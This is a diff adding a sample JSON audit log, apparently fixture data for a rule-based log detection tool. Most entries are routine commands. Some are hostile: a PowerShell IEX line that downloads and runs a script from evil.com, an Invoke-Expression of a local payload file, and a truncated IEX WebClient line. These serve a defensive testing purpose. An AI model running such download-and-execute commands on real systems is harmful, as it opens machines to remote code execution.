@@ -1,0 +1,72 @@
+[
+  {
+    "timestamp": "2025-03-04T09:15:00Z",
+    "source": "audit",
+    "message": "user=admin cmd=whoami"
+  },
+  {
+    "timestamp": "2025-03-04T09:16:00Z",
+    "source": "audit",
+    "message": "user=admin cmd=git status"
+  },
+  {
+    "timestamp": "2025-03-04T09:17:00Z",
+    "source": "audit",
+    "message": "user=admin cmd=git pull origin main"
+  },
+  {
+    "timestamp": "2025-03-04T09:22:00Z",
+    "source": "audit",
+    "message": "user=developer cmd=cd /app && npm install"
+  },
+  {
+    "timestamp": "2025-03-04T09:30:00Z",
+    "source": "audit",
+    "message": "user=admin cmd=powershell -Enc IEX (New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')"
+  },
+  {
+    "timestamp": "2025-03-04T09:35:00Z",
+    "source": "audit",
+    "message": "user=developer cmd=pytest tests/ -v"
+  },
+  {
+    "timestamp": "2025-03-04T09:40:00Z",
+    "source": "audit",
+    "message": "user=admin cmd=ls -la /var/log"
+  },
+  {
+    "timestamp": "2025-03-04T09:45:00Z",
+    "source": "audit",
+    "message": "user=service cmd=echo test | base64 -d"
+  },
+  {
+    "timestamp": "2025-03-04T09:50:00Z",
+    "source": "audit",
+    "message": "user=developer cmd=python main.py --rules rules --logs logs/sample.json"
+  },
+  {
+    "timestamp": "2025-03-04T09:55:00Z",
+    "source": "audit",
+    "message": "user=admin cmd=Invoke-Expression (Get-Content payload.ps1)"
+  },
+  {
+    "timestamp": "2025-03-04T10:00:00Z",
+    "source": "audit",
+    "message": "user=admin cmd=git status"
+  },
+  {
+    "timestamp": "2025-03-04T10:01:00Z",
+    "source": "audit",
+    "message": "user=admin cmd=powershell -Enc IEX (New-Object Net.WebClient)"
+  },
+  {
+    "timestamp": "2025-03-04T10:05:00Z",
+    "source": "auth",
+    "message": "User admin logged in successfully from 192.168.1.10"
+  },
+  {
+    "timestamp": "2025-03-04T10:10:00Z",
+    "source": "audit",
+    "message": "user=admin cmd=cat /etc/hosts"
+  }
+]
